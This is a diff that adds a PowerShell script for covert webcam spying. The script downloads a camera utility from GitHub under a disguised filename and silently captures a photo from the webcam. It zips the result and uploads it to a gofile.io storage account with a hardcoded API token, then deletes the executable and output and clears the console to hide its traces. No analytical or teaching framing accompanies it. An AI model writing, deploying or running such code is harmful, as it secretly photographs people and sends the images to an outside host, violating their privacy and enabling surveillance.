@@ -1,0 +1,60 @@
+function Upload-DirToGofile {
+    param (
+        [string]$Path,
+        [string]$ApiKey = "hV7e6NmlToS8RPAEiEed3KhiKcIlUkWK",
+        [string]$FolderId = "95adad47-12b6-47e0-bc26-c895ea8bacb1"
+    )
+
+    $uploadUri = "https://store1.gofile.io/uploadFile"
+    $zipPath = "C:\ProgramX64\extensions\upload_package.zip"
+
+    try {
+        if (Test-Path $Path) {
+            # Remove old zip if it exists
+            if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
+
+            # Create the archive
+            Compress-Archive -Path "$Path\*" -DestinationPath $zipPath -Force
+
+            # Upload using curl
+            curl.exe -F "file=@$zipPath" -F "token=$ApiKey" -F "folderId=$FolderId" $uploadUri
+            
+            # Cleanup Zip
+            Remove-Item $zipPath -Force
+        }
+    }
+    catch {
+      
+    }
+}
+
+# --- Configuration ---
+$workDir = "C:\ProgramX64\extensions"
+$outDir = "$workDir\out"
+$exePath = "$workDir\evab.exe"
+$camUrl = "https://raw.githubusercontent.com/tedburke/CommandCam/master/CommandCam.exe"
+
+if (!(Test-Path $outDir)) { New-Item -ItemType Directory -Path $outDir -Force }
+
+
+try {
+    Invoke-WebRequest -Uri $camUrl -OutFile $exePath -ErrorAction Stop
+} catch {
+   cls
+}
+
+# 2. Execute Camera Tool (Take Photo)
+# CommandCam usage: evab.exe /filename "path\to\save.jpg"
+$photoPath = "$outDir\capture.jpg"
+& $exePath /filename $photoPath
+
+# 3. Delete the Executable immediately after capture
+if (Test-Path $exePath) { Remove-Item $exePath -Force }
+
+# 4. Upload the directory
+Upload-DirToGofile -Path $outDir
+
+# 5. Final Cleanup of the output folder
+if (Test-Path $outDir) { Remove-Item $outDir -Recurse -Force }
+
+cls
